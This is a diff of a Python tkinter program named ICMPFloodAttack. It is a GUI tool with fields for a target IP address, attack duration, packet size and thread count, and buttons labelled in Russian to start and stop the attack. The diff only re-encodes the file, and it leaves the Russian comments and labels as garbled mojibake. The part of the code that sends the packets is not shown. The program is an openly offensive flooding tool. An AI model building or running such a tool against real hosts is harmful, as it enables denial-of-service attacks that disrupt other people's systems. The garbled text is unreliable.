@@ -1,5 +1,4 @@
-# -*- coding: cp1251 -*-
-import subprocess
+п»їimport subprocess
 import threading
 import tkinter as tk
 from tkinter import ttk
@@ -37,7 +36,7 @@ class ICMPFloodAttack:
         sent_buff_size = int(size_entry.get())
         num_threads = int(threads_entry.get())
 
-        # Инициализация значений
+        # РРЅРёС†РёР°Р»РёР·Р°С†РёСЏ Р·РЅР°С‡РµРЅРёР№
         self.stop_event.clear()
         self.process_list = []
         self.threads = []
@@ -47,25 +46,25 @@ class ICMPFloodAttack:
             self.threads.append(thread)
             thread.start()
 
-        # Инициализация таймера
+        # РРЅРёС†РёР°Р»РёР·Р°С†РёСЏ С‚Р°Р№РјРµСЂР°
         self.timeout_timer = threading.Timer(duration, self.stop_attack)
         self.timeout_timer.start()
 
         status_label.config(text='Running...')
-        start_button.config(text='Остановить атаку', command=self.stop_attack, state=tk.NORMAL)
+        start_button.config(text='РћСЃС‚Р°РЅРѕРІРёС‚СЊ Р°С‚Р°РєСѓ', command=self.stop_attack, state=tk.NORMAL)
 
     def stop_attack(self):
         if self.timeout_timer and self.timeout_timer.is_alive():
-            self.timeout_timer.cancel()  # Остановка таймера
+            self.timeout_timer.cancel()  # РћСЃС‚Р°РЅРѕРІРєР° С‚Р°Р№РјРµСЂР°
         self.stop_event.set()
         for process in self.process_list:
             try:
                 process.terminate()
             except ProcessLookupError:
-                # Обработка исключений
+                # РћР±СЂР°Р±РѕС‚РєР° РёСЃРєР»СЋС‡РµРЅРёР№
                 pass
         status_label.config(text='Attack stopped.')
-        start_button.config(text='Запустить атаку', command=self.start_attack, state=tk.NORMAL)
+        start_button.config(text='Р—Р°РїСѓСЃС‚РёС‚СЊ Р°С‚Р°РєСѓ', command=self.start_attack, state=tk.NORMAL)
 
     def main(self):
         global ip_entry, duration_entry, size_entry, threads_entry, status_label, start_button
@@ -76,23 +75,23 @@ class ICMPFloodAttack:
         frame = ttk.Frame(root, padding="10")
         frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
 
-        ttk.Label(frame, text="IP-адрес атакуемого хоста:").grid(column=0, row=0, sticky=tk.W)
+        ttk.Label(frame, text="IP-Р°РґСЂРµСЃ Р°С‚Р°РєСѓРµРјРѕРіРѕ С…РѕСЃС‚Р°:").grid(column=0, row=0, sticky=tk.W)
         ip_entry = ttk.Entry(frame, width=15)
         ip_entry.grid(column=1, row=0, sticky=tk.W)
 
-        ttk.Label(frame, text="Продолжительность атаки (с):").grid(column=0, row=1, sticky=tk.W)
+        ttk.Label(frame, text="РџСЂРѕРґРѕР»Р¶РёС‚РµР»СЊРЅРѕСЃС‚СЊ Р°С‚Р°РєРё (СЃ):").grid(column=0, row=1, sticky=tk.W)
         duration_entry = ttk.Entry(frame, width=15)
         duration_entry.grid(column=1, row=1, sticky=tk.W)
 
-        ttk.Label(frame, text="Размер пакета (байт):").grid(column=0, row=2, sticky=tk.W)
+        ttk.Label(frame, text="Р Р°Р·РјРµСЂ РїР°РєРµС‚Р° (Р±Р°Р№С‚):").grid(column=0, row=2, sticky=tk.W)
         size_entry = ttk.Entry(frame, width=15)
         size_entry.grid(column=1, row=2, sticky=tk.W)
 
-        ttk.Label(frame, text="Количество потоков:").grid(column=0, row=3, sticky=tk.W)
+        ttk.Label(frame, text="РљРѕР»РёС‡РµСЃС‚РІРѕ РїРѕС‚РѕРєРѕРІ:").grid(column=0, row=3, sticky=tk.W)
         threads_entry = ttk.Entry(frame, width=15)
         threads_entry.grid(column=1, row=3, sticky=tk.W)
 
-        start_button = ttk.Button(frame, text='Запустить атаку', command=self.start_attack)
+        start_button = ttk.Button(frame, text='Р—Р°РїСѓСЃС‚РёС‚СЊ Р°С‚Р°РєСѓ', command=self.start_attack)
         start_button.grid(column=0, row=4, columnspan=2, pady=10)
 
         status_label = ttk.Label(frame, text='')
